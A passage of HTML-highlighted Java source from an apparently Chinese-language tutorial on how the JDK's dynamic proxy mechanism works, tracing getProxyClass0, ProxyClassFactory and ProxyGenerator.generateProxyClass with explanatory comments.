punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InvocationTargetException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token class-name\">Throwable</span> t <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span><span class=\"token function\">getCause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>t <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">RuntimeException</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                <span class=\"token keyword\">throw</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">RuntimeException</span><span class=\"token punctuation\">)</span> t<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InternalError</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NoSuchMethodException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InternalError</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>利用 getProxyClass0 (loader, intfs) 生成代理类 Proxy 的 Class 对象。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">getProxyClass0</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassLoader</span> loader<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                                           <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> interfaces<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token comment\">// 如果接口数量大于 65535，抛出非法参数错误</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>interfaces<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">65535</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"interface limit exceeded\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>       </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\">// 如果指定接口的代理类已经存在与缓存中，则不用新创建，直接从缓存中取即可；</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token comment\">// 如果缓存中没有指定代理对象，则通过 ProxyClassFactory 来创建一个代理对象。</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">return</span> proxyClassCache<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>loader<span class=\"token punctuation\">,</span> interfaces<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ProxyClassFactory 内部类创建、定义代理类，返回给定 ClassLoader 和 interfaces 的代理类。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ProxyClassFactory</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">implements</span> <span class=\"token class-name\">BiFunction</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">ClassLoader</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span><span class=\"token operator\">></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token comment\">// 代理类的名字的前缀统一为 “$Proxy”</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> proxyClassNamePrefix <span class=\"token operator\">=</span> <span class=\"token string\">\"$Proxy\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">// 每个代理类前缀后面都会跟着一个唯一的编号，如 $Proxy0、$Proxy1、$Proxy2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">AtomicLong</span> nextUniqueNumber <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AtomicLong</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">apply</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassLoader</span> loader<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> interfaces<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Boolean</span><span class=\"token punctuation\">></span></span> interfaceSet <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IdentityHashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span>interfaces<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> intf <span class=\"token operator\">:</span> interfaces<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token comment\">// 验证类加载器加载接口得到对象是否与由 apply 函数参数传入的对象相同</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> interfaceClass <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                    interfaceClass <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span>intf<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> loader<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassNotFoundException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>interfaceClass <span class=\"token operator\">!=</span> intf<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                    <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                        intf <span class=\"token operator\">+</span> <span class=\"token string\">\" is not visible from class loader\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token comment\">// 验证这个 Class 对象是不是接口</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>interfaceClass<span class=\"token punctuation\">.</span><span class=\"token function\">isInterface</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                    <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                        interfaceClass<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\" is not an interface\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>interfaceSet<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>interfaceClass<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Boolean</span><span class=\"token punctuation\">.</span><span class=\"token constant\">TRUE</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                        <span class=\"token string\">\"repeated interface: \"</span> <span class=\"token operator\">+</span> interfaceClass<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token class-name\">String</span> proxyPkg <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// package to define proxy class in</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">int</span> accessFlags <span class=\"token operator\">=</span> <span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">.</span><span class=\"token constant\">PUBLIC</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">.</span><span class=\"token constant\">FINAL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>             * Record the package of a non-public proxy interface so that the</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>             * proxy class will be defined in the same package.  Verify that</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>             * all non-public proxy interfaces are in the same package.</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>             */</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> intf <span class=\"token operator\">:</span> interfaces<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                <span class=\"token keyword\">int</span> flags <span class=\"token operator\">=</span> intf<span class=\"token punctuation\">.</span><span class=\"token function\">getModifiers</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">.</span><span class=\"token function\">isPublic</span><span class=\"token punctuation\">(</span>flags<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                    accessFlags <span class=\"token operator\">=</span> <span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">.</span><span class=\"token constant\">FINAL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                    <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> intf<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                    <span class=\"token keyword\">int</span> n <span class=\"token operator\">=</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">lastIndexOf</span><span class=\"token punctuation\">(</span><span class=\"token char\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                    <span class=\"token class-name\">String</span> pkg <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>n <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string\">\"\"</span> <span class=\"token operator\">:</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> n <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>proxyPkg <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                        proxyPkg <span class=\"token operator\">=</span> pkg<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>pkg<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>proxyPkg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>                            <span class=\"token string\">\"non-public interfaces from different packages\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>proxyPkg <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                <span class=\"token comment\">// if no non-public proxy interfaces, use com.sun.proxy package</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                proxyPkg <span class=\"token operator\">=</span> <span class=\"token class-name\">ReflectUtil</span><span class=\"token punctuation\">.</span><span class=\"token constant\">PROXY_PACKAGE</span> <span class=\"token operator\">+</span> <span class=\"token string\">\".\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>            <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>             * Choose a name for the proxy class to generate.</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>             */</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            <span class=\"token keyword\">long</span> num <span class=\"token operator\">=</span> nextUniqueNumber<span class=\"token punctuation\">.</span><span class=\"token function\">getAndIncrement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            <span class=\"token class-name\">String</span> proxyName <span class=\"token operator\">=</span> proxyPkg <span class=\"token operator\">+</span> proxyClassNamePrefix <span class=\"token operator\">+</span> num<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>            <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>             * </pre></td></tr><tr><td data-num=\"72\"></td><td><pre>             * 生成指定代理类的字节码文件</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>             */</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>            <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> proxyClassFile <span class=\"token operator\">=</span> <span class=\"token class-name\">ProxyGenerator</span><span class=\"token punctuation\">.</span><span class=\"token function\">generateProxyClass</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>                proxyName<span class=\"token punctuation\">,</span> interfaces<span class=\"token punctuation\">,</span> accessFlags<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token function\">defineClass0</span><span class=\"token punctuation\">(</span>loader<span class=\"token punctuation\">,</span> proxyName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>                                    proxyClassFile<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> proxyClassFile<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassFormatError</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>                <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>                 * A ClassFormatError here means that (barring bugs in the</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>                 * proxy class generation code) there was some other</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>                 * invalid aspect of the arguments supplied to the proxy</pre></td></tr><tr><td data-num=\"84\"></td><td><pre>                 * class creation (such as virtual machine limitations</pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                 * exceeded).</pre></td></tr><tr><td data-num=\"86\"></td><td><pre>                 */</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>一系列检查后，调用 ProxyGenerator.generateProxyClass 来生成字节码文件。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">generateProxyClass</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> var0<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> var1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> var2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">ProxyGenerator</span> var3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ProxyGenerator</span><span class=\"token punctuation\">(</span>var0<span class=\"token punctuation\">,</span> var1<span class=\"token punctuation\">,</span> var2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token comment\">// 真正用来生成代理类字节码文件的方法在这里</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">final</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> var4 <span class=\"token operator\">=</span> var3<span class=\"token punctuation\">.</span><span class=\"token function\">generateClassFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token comment\">// 保存代理类的字节码文件</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>saveGeneratedFiles<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token class-name\">AccessController</span><span class=\"token punctuation\">.</span><span class=\"token function\">doPrivileged</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">PrivilegedAction</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Void</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                <span class=\"token keyword\">public</span> <span class=\"token class-name\">Void</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                        <span class=\"token keyword\">int</span> var1 <span class=\"token operator\">=</span> var0<span class=\"token punctuation\">.</span><span class=\"token function\">lastIndexOf</span><span class=\"token punctuation\">(</span><span class=\"token number\">46</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                        <span class=\"token class-name\">Path</span> var2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>var1 <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                            <span class=\"token class-name\">Path</span> var3 <span class=\"token operator\">=</span> <span class=\"token class-name\">Paths</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>var0<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> var1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token char\">'.'</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">.</span>separatorChar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                            <span class=\"token class-name\">Files</span><span class=\"token punctuation\">.</span><span class=\"token function\">createDirectories</span><span class=\"token punctuation\">(</span>var3<span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileAttribute</span><span class=\"token 